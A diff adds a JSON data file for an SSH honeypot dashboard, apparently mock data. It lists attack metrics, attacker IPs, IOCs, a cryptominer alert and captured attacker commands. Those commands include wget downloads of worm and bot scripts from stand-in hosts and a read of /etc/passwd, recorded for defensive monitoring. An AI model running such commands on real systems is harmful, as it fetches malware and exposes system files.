@@ -1,0 +1,83 @@
+{
+  "node_id": "EDU-01",
+  "identity": {
+    "name": "EDU-01",
+    "type": "SSH Honeypot (Cowrie)",
+    "sector": "Education",
+    "ip_address": "192.168.10.5",
+    "os": "Ubuntu 22.04 LTS",
+    "status": "ONLINE",
+    "uptime_seconds": 3931200
+  },
+  "metrics": {
+    "risk_level": "CRITICAL",
+    "total_attacks_24h": 14205,
+    "unique_attackers_24h": 842,
+    "top_attack_type": "Brute Force",
+    "last_activity_ts": "2024-02-07T14:30:00Z"
+  },
+  "attack_vectors": {
+    "brute_force": 65,
+    "exploits": 15,
+    "scanning": 15,
+    "malware": 5
+  },
+  "top_attackers": [
+    {
+      "ip": "104.22.51.11",
+      "country_code": "CN",
+      "attempts": 4210,
+      "risk_score": 98
+    },
+    {
+      "ip": "185.100.84.2",
+      "country_code": "RU",
+      "attempts": 3850,
+      "risk_score": 95
+    }
+  ],
+  "geo_intelligence": {
+    "countries": [
+      { "name": "China", "percentage": 45 },
+      { "name": "Russia", "percentage": 30 },
+      { "name": "USA", "percentage": 15 },
+      { "name": "Germany", "percentage": 10 }
+    ]
+  },
+  "latest_events": [
+    {
+      "timestamp": "2024-02-07T14:29:55Z",
+      "src_ip": "104.22.51.11",
+      "type": "CMD_EXEC",
+      "payload": "wget http://malicious.com/worm.sh",
+      "protocol": "SSH"
+    }
+  ],
+  "captured_payloads": [
+    {
+      "command": "wget http://185.10.x.x/bot.sh",
+      "timestamp": "2024-02-07T12:00:00Z"
+    },
+    {
+      "command": "cat /etc/passwd",
+      "timestamp": "2024-02-07T12:05:00Z"
+    }
+  ],
+  "iocs": [
+    { "type": "ip", "value": "104.22.51.11" },
+    { "type": "hash_md5", "value": "b49a...e21" },
+    { "type": "domain", "value": "wget-dl.xyz" }
+  ],
+  "active_alerts": [
+    {
+      "title": "MALWARE UPLOAD",
+      "description": "CoinMiner.Linux.XMR detected in /tmp",
+      "severity": "HIGH",
+      "timestamp": "2024-02-07T10:00:00Z"
+    }
+  ],
+  "timeline_data": {
+    "labels": ["00:00", "01:00", "02:00"],
+    "values": [120, 150, 180]
+  }
+}
